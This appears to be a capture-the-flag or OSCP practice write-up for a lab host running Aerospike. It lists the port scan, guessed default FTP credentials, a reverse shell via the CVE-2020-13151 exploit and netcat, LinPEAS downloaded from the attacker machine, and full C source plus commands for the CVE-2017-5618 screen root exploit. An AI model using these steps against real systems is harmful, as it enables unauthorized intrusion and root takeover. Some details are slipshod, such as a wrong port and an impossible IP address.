- nmap -v -sCTV -p- -Pn -T4 192.168.228.143
  - Open port 21, 22, 80, 81, 443, 3000, 3001, 3003, 3306, 5432
- ftp 192.168.228.143
  - Try creds:
    - anonymous / anonymous
    - root / rootpasswd
- Check for URL in browser - 192.168.228.143:3301
- nc 192.168.228.143 3003
  - ?
  - help
<img width="839" alt="Screenshot 2024-03-20 at 8 47 27 PM" src="https://github.com/Vamckis/OSCP-Preparation/assets/71128825/285bd26a-f659-47a5-9d41-b135abe33a8b">

- Aerospike Database (< 5.1.0.3) has Host Command Execution.
  - Download CVE docs - https://github.com/b4ny4n/CVE-2020-13151
  - rlwrap nc -nlvp 443
  - python cve2020-13151.py --ahost 192.168.228.143 --netcatshell --lhost=192.168.45.241 --lport=443
  - We get shell on nc
    - check if we have any sudo privileges
      - sudo -l   
    - script /dev/null -c bash
    - bash: /root/.bashrc: Permission Denied

- LinPEAS : Linux Privilege Escalation Awesome Script. It contains set of commands to do privilege escalation.
  - File transfer above script into 192.168.228.143 using python server
    - python -m http.server 80
  - Download file from nc shell
    - wget 192.168.45.241/linpeas_linux_amd64
      - permission denied 
    -  We generally have write access to home,tmp folders.
      - cd /home/aero
      - wget 192.168.45.241/linpeas_linux_amd64 -- Successful
<img width="601" alt="Screenshot 2024-03-20 at 9 11 32 PM" src="https://github.com/Vamckis/OSCP-Preparation/assets/71128825/de1f679c-f200-4304-80e9-e0dcc10a8c66">

 - Check file type:
   - file linpeas_linux_amd64
   - give executable access
     - chmod +x linpeas_linux_amd64
   - ./linpeas_linux_amd64
   - Below are results of linpeas.
   <img width="1155" alt="Screenshot 2024-03-20 at 9 34 03 PM" src="https://github.com/Vamckis/OSCP-Preparation/assets/71128825/782adbf5-c23f-436c-aa91-b06537c771ef">
- In basic info, OS is gcc-v9.3.0 (it is C Compiler) - we can perform kernal exploit
- linpiece suggestes all usable exploits:
  <img width="907" alt="Screenshot 2024-03-20 at 9 37 21 PM" src="https://github.com/Vamckis/OSCP-Preparation/assets/71128825/a4ad36e9-e3b3-41ff-b6c8-67e39c581aa8">
- Also check for any unusal services running as root. No issues as per below ss:
<img width="1261" alt="Screenshot 2024-03-20 at 9 40 41 PM" src="https://github.com/Vamckis/OSCP-Preparation/assets/71128825/605fe8dd-08f5-4355-95b5-aec4b007caef">

#### Cron Job
- Cron job is a scheduled job. If any service running as root, we should check if we can
  - /etc/cron.d
  - We need to check for a service which runs for every 5mins. so that job will execute our commands, instead fo waiting for long time.

- Check for any new ports available.
<img width="653" alt="Screenshot 2024-03-20 at 9 44 29 PM" src="https://github.com/Vamckis/OSCP-Preparation/assets/71128825/5f4fba27-ff42-40d3-a717-61ffe08c57bc">

- Check for users, some times we need to excalate to a usr and then get root 
  <img width="571" alt="Screenshot 2024-03-20 at 9 46 01 PM" src="https://github.com/Vamckis/OSCP-Preparation/assets/71128825/9d921857-66c8-43ec-b0a8-a8faded6b138">

- Manually check if we can find any sensitive infi in the files:
<img width="716" alt="Screenshot 2024-03-20 at 9 49 04 PM" src="https://github.com/Vamckis/OSCP-Preparation/assets/71128825/6db55b8d-3472-46ca-9cbb-3ae578cc1e54">

### privilege escalation using - CVE-2017-5618 
- https://www.exploit-db.com/exploits/41154
- We perform the exploit manually, as gcc versions are different.
- Create files libhax.c and rootshell.c, with below codes, in local machine and transfer to 192.168.256.143/tmp/libhax.c
```
#libhax.c
#!/bin/bash
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
__attribute__ ((__constructor__))
void dropshell(void){
    chown("/tmp/rootshell", 0, 0);
    chmod("/tmp/rootshell", 04755);
    unlink("/etc/ld.so.preload");
    printf("[+] done!\n");
}
EOF
```
```
#rootshell.c
#include <stdio.h>
int main(void){
    setuid(0);
    setgid(0);
    seteuid(0);
    setegid(0);
    execvp("/bin/sh", NULL, NULL);
}
```
  - gcc-9 -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c
  - gcc-9 -o /tmp/rootshell /tmp/rootshell.c
  - cd /etc
  - umask 000
  - screen -D -m -L ld.so.preload echo -ne  "\x0a/tmp/libhax.so"
  - screen -ls 
  - /tmp/rootshell
- we got root access. Get terminal access by below:
  - script /dev/null -c bash
<img width="299" alt="Screenshot 2024-03-20 at 10 16 43 PM" src="https://github.com/Vamckis/OSCP-Preparation/assets/71128825/8a307be6-2181-45e0-aee9-7584ff9a6262">

- 2 flags: proof flag (in root/user directory) and local flags (in user/home director)  
